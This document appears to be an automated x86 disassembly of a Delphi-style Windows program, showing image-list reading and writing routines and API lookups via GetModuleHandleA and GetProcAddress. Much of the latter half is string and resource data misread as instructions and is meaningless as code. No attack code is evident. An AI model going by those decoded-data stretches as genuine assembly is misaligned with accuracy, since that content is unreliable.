mov eax [ r-xdata ]
call sub_427168
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b758
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41aac4
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41aae4
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45b73b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4284a0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416c50
mov eax [ ebp - 0x4 ]
call sub_45bb00
xor eax eax
push ebp
push sub_45b71e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b725
mov eax [ ebp - 0xc ]
call sub_403174
mov eax [ ebp - 0x14 ]
call sub_403174
mov eax [ ebp - 0x4 ]
call sub_45bb04
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416c78
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_427730
push eax
mov eax [ ebp - 0xc ]
call sub_427730
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424480
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416c78
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_427730
push eax
mov eax [ ebp - 0x14 ]
call sub_427730
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424480
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45aa40
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45b768
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4214c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b7c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a8d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b7cf
mov eax [ ebp - 0xc ]
call sub_403174
retn
sub eax 0xffffffec
sub_45b7cf
mov eax [ ebp - 0x4 ]
call sub_45a7c8
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45b8fe
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41aae4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41b1ec
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41aae4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403174
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41aae4
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4214c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b8e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41aae4
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a8d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403174
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41aae4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_45b930
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_45a968
mov eax edi
call sub_41aac4
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41aae4
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_45b4d4
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_45b768
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45b9bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4214c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45bab6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bf5c
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_45a904
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_45a904
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45babd
mov eax [ ebp - 0x4 ]
call sub_403174
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
jmp r-xdata
sub_45bb24
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
mov edx esi
call sub_45b294
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_45bb70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45bb95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bb9c
retn
sub_45bbac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_45c35c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ecx
inc ebp
add [ eax ] dl
les eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al

xor eax [ eax ]
lodsb [ esi ]
insd
jl r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb sub_45c35c
inc ebp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
ja r-xdata
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x7 ] al
inc esi
add ah ch
cmovbe eax [ eax ]
xor [ eax ] cl
inc esi
add [ eax + edx ] bl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ch
add [ eax ] al
add eax [ eax ]
std
jb r-xdata
jae r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
push cs
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
inc esi
add [ eax ] ch
dec ecx
je r-xdata
loopne r-xdata
insd
add al 0xbd
inc ebp
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
insd
lea eax [ eax ]
movsb [ edi ] [ esi ]
retn
inc eax
add [ eax ] ch
xor [ eax ] eax
fadd [ edi ]
inc esi
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + 0xd ] al
inc edx
add [ eax - 0x75 ] dh
inc ecx
add [ eax + edx ] al
inc esi
add [ eax + 0x28004610 ] ah
inc ecx
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ebx + esi + 0x310c0040 ] ch
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
xor eax [ eax ]
or al 0x31
xor eax [ eax ]
mov [ edx ] cs
inc edx
add [ eax - 0x53ffbfcd ] bh
ja r-xdata
add dl dh
retn
je r-xdata
sub_45c3f8
out dx eax
call [ eax + ecx ]
inc esi
add [ eax + ecx ] bh
inc esi
add [ esp + ecx ] ah
inc esi
add [ 0x6e654d54 ] al
jne r-xdata
inc ecx
add [ ebx ] al
add [ 0x756e654d ] al
jae r-xdata
les eax [ ebp ]
pop es
add eax 0x6e654d54
jne r-xdata
sbb al al
inc ebp
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
add [ eax ] bl
rol [ ebp ] 0x34
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
and [ edi ] cl
inc edx
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x7 ] al
inc esi
add ah ch
cmovbe eax [ eax ]
xor [ eax ] cl
inc esi
add [ eax + edx ] bl
retn
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ch
add [ eax ] al
add eax [ eax ]
std
add [ eax ] dh
or [ esi ] al
sbb al 0x10
inc eax
add [ eax + 0x45c4 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
les eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xc4
inc ebp
add [ eax ] ah
add [ eax ] al
pop eax
retn
sub [ esi ] cl
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x7 ] al
inc esi
add ah ch
cmovbe eax [ eax ]
fcom [ 0x15200046 ]
inc esi
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shl ah 0xc4
inc ebp
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x98756e65
les eax [ ebp ]
or al 0xc4
inc ebp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
jae r-xdata
insd
add al dl
adc al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ esi + edi * 4 ] dh
inc ebp
add al al
adc al 0x46
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
[ eax ]
jns r-xdata
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] cl
add bh bh
adc [ fs : esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
cwde
xor al 0xbe
inc ebp
add al ah
adc al 0x46
add al dh
adc al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
inc [ eax ]
adc eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x75410900
je r-xdata
inc eax
add [ ecx ] al
add bh bh
pop esp
adc al 0x46
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9865646f
dec eax
push esp
inc ecx
add [ eax ] dh
add [ eax ] al
dec [ eax + 0x14 ]
inc esi
add [ eax + 0xd ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
lodsb [ esi ]
mov [ ebp ] 0xd
insd
popad
dec esp
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + eax * 8 ] ch
inc ebp
add [ esi ] al
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4065646f
mov esp 0x500045
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
xor dh al
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
[ esp + edx + 0x46 ]
mov [ ebp ] 0x8d
inc eax
outsd
jo r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
mov al 0xc6
inc ebp
add [ ebx ] al
jo r-xdata
or eax 0x6f42616d
insd
jo r-xdata
outsd
inc ebp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] ch
xor [ eax ] eax
xor al 0x1c
inc esi
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + 0xd ] al
inc edx
add [ eax - 0x75 ] dh
inc ecx
add [ eax + edx ] al
inc esi
add [ eax + 0x28004610 ] ah
push cs
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add al al
sbb eax [ esi ]
in al dx
cmovbe eax [ eax ]
xor [ eax ] cl
inc esi
add [ eax + edx ] bl
inc esi
add [ eax + 0x1c ] ch
inc esi
add [ eax ] ah
sbb eax 0x540a0046
push eax
outsd
jo r-xdata
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
pop eax
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
mov [ ebp ] 0x78
outsd
inc edx
outsd
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
add al ah
adc al 0x46
add al dh
adc al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add [ ebx + esi + 0x310c0040 ] ch
outsd
insd
jo r-xdata
je r-xdata
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
add al al
adc al 0x46
add al dl
adc al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsd
sbb bh al
inc ebp
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + eax * 8 + 0x45 ] ch
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
je r-xdata
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
inc eax
cmp [ ecx ] dl
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0xac004033
rol bh 0x1
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
andps xmm1 [ ebp + 0x65 ]
outsb
mov [ ebp ] 0x3
xor eax [ eax ]
or al 0x31
xor eax [ eax ]
mov [ edx ] cs
inc edx
add [ eax - 0x53ffbfcd ] bh
add [ edi + eax * 8 + 0x45 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ esi + eax * 8 + 0x408d0045 ] ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol bh 0x45
add [ eax ] bh
add [ eax ] al
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
sub [ edi ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
[ esp + edx + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
cwde
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] cl
add bh bh
adc [ fs : esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
sub al 0x81
inc ecx
add al dl
add [ ecx ] 0x10
test [ ecx ] eax
add [ ecx - 0x7e03ffbf ] 0x41
add [ eax ] bh
push ss
inc esi
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
push ebp
push esp
inc ecx
add [ eax ] dh
add [ eax ] al
dec [ eax + 0x14 ]
inc esi
add [ eax + 0xd ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
inc ecx
add [ esp + ebx + 0x46 ] bh
add [ esp + ebx + 0x10046 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x55
xor al 0xbe
inc ebp
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
0x45
jo r-xdata
inc ebx
push 0x65676e61
nop
push ebp
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
mov [ ebp ] 0x68
add [ eax ] al
[ eax ]
inc ecx
add [ eax ] al
add [ edx ] cl
add [ 0x756e654d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
mov [ ebp ] 0xff000069
imul eax [ eax ] 0x1ff00
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ ebx + ebx * 2 ] dl
outsb
inc eax
mov esp 0x500045
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
outsb
push edx
jne r-xdata
mov [ ebp ] r-xdata
adc [ eax ] al
add eax 0x756e654d
jae r-xdata
je r-xdata
shl [ eax ] 0xca
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 8 ] dh
inc ebp
add [ eax + eax ] dl
add [ eax ] al
adc al 0x5b
mov ah 0x96
inc edx
add [ eax ] bl
xchg edi eax
inc edx
add al bh
xchg esi eax
inc edx
add ah ah
xchg esi eax
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x45ca8c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80045ca ] bl
add [ eax ] al
add [ ebp + edx * 4 + 0x42 ] dh
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
xor al 0xbe
inc ebp
add [ esi + eax * 8 ] ch
inc ebp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
test ebx ebx
je r-xdata
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
outsd
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_451708
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_45c419
inc ebp
add [ edx + ebp * 2 + 0x41 ] cl
add [ ebx ] al
add [ 0x756e654d ] al
jae r-xdata
sbb al al
inc ebp
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
add [ eax ] bl
rol [ ebp ] 0x34
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
add [ eax ] dh
or [ esi ] al
sbb al 0x10
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ch
add [ eax ] al
add eax [ eax ]
std
inc eax
add [ eax + 0x45c4 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
les eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xc4
inc ebp
add [ eax ] ah
add [ eax ] al
pop eax
retn
sub [ esi ] cl
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
